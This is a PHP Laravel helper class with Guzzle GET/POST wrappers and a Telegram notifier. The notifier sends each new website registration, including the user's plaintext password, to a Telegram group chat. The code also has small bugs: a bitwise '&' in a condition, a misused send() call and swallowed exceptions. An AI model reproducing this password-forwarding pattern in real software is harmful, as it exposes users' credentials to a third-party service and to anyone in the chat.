<?php

namespace App\Classes;

use Mail;
use App\UserActivation;
use App\Mail\UserActivationEmail;
use App\User;

class ApiServices
{
    public static function GetApi($url)
    {
        try {
            $client = new \GuzzleHttp\Client();
            $request = $client->get($url);
            $response = $request->getBody();
            return $response;
        } catch (\Throwable $th) {
            //throw $th;
        }
    }


    public static function PostApi($url, $body)
    {
        $client = new \GuzzleHttp\Client();
        $response = $client->request("POST", $url, ['form_params' => $body]);
        $response = $client->send($response);
        return $response;
    }

    public static function NotificationTelegam($params)
    {
        try {
            $TELE_TOKEN = env("TELE_TOKEN", "");
            $TELE_GROUP = env("TELE_GROUP", "");
            $MESSENGER = urlencode("Thông báo người dùng đăng ký Website mới: \n Họ và tên: " . ($params['name'] ?? '-') . " \n Tên miền: " . ($params['domain'] ?? '-') . " \n Tên đăng nhập: " . ($params['username'] ?? '-') . " \n Mật khẩu: " . ($params['password'] ?? '-') . " \n Thời gian: " . ($params['time'] ?? '-'));
            $url = "https://api.telegram.org/bot" . $TELE_TOKEN . "/sendMessage?chat_id=" . $TELE_GROUP . "&text=" . $MESSENGER;
            if ($TELE_TOKEN !== '' & $TELE_GROUP !== '') {
                $client = new \GuzzleHttp\Client();
                $request = $client->get($url);
                $response = $request->getBody();
            }
        } catch (\Throwable $th) {
            //throw $th;
        }
    }
}
